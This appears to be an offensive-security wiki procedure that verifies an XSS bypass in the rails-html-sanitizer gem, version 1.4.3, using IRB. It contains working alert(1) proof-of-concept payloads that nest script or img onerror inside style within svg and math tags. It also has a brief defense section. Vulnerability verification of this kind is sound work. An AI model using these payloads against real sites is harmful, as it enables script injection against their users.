---
id: proc-verify-xss-irb
tags:
  - xss
  - irb
  - verification
type: procedure
tools:
  - '[[tools/IRB]]'
  - '[[tools/rails-html-sanitizer]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/load-rails-html-sanitizer-gem]]'
  - '[[commands/test-svg-style-xss-payload]]'
  - '[[commands/test-math-style-xss-payload]]'
  - '[[commands/check-rails-sanitizer-version]]'
verified: false
platforms:
  - Ruby on Rails
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:25.781Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Verify-XSS-in-Rails-Sanitizer-Using-IRB

## Summary

This procedure verifies the XSS vulnerability in Rails::Html::SafeListSanitizer by executing PoC payloads in IRB, confirming that svg+style and math+style allow unsanitized JavaScript like alert(1).

## Description

Using IRB, load the vulnerable gem and call the sanitize method with allowlisted tags. The sanitizer fails to remove contents in style tags when nested in svg or math, persisting <script> or onerror attributes. This is tested on version 1.4.3. Expected outcome: Malicious code remains in output, enabling XSS in rendered HTML.

## Requirements

1. IRB installed (part of Ruby)
2. rails-html-sanitizer gem version 1.4.3
3. Basic Ruby knowledge for payload crafting

## Defense

Defensive measures and detection strategies:

- Patch to latest rails-html-sanitizer
- Audit allowlists to exclude style with svg/math
- Use server-side logging for sanitization failures
- Deploy WAF rules to block suspicious HTML inputs

## Objectives

1. Load and test sanitizer with PoCs
2. Confirm payload persistence
3. Identify vulnerable version

## Instructions

### Step 1: Load the Gem

**Context**: Initialize the Ruby environment for sanitizer testing.

**Command** ([[commands/load-rails-html-sanitizer-gem]]):
```ruby
require 'rails-html-sanitizer'
```

> Prepares classes like SafeListSanitizer. Expected output: false.

### Step 2: Test SVG+Style Payload

**Context**: Sanitize a payload nesting script in style within svg.

**Command** ([[commands/test-svg-style-xss-payload]]):
```ruby
Rails::Html::SafeListSanitizer.new.sanitize("<svg><style><script>alert(1)</script></style></svg>", tags: ["svg", "style"]).to_s
```

> Returns unsanitized string if vulnerable. Expected: "<svg><style><script>alert(1)</script></style></svg>".

### Step 3: Test Math+Style Payload

**Context**: Similar test for math tag with img onerror.

**Command** ([[commands/test-math-style-xss-payload]]):
```ruby
Rails::Html::SafeListSanitizer.new.sanitize("<math><style><img src=x onerror=alert(1)></style></math>", tags: ["math", "style"]).to_s
```

> Expected: "<math><style><img src=x onerror=alert(1)></style></math>".

### Step 4: Check Version

**Context**: Verify the gem version is vulnerable.

**Command** ([[commands/check-rails-sanitizer-version]]):
```ruby
puts Rails::Html::Sanitizer::VERSION
```

> Expected: 1.4.3.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/load-rails-html-sanitizer-gem]]
- [[commands/test-svg-style-xss-payload]]
- [[commands/test-math-style-xss-payload]]
- [[commands/check-rails-sanitizer-version]]

## Tools Used

- [[tools/IRB]]

## Tags

- [[xss]]
- [[verification]]
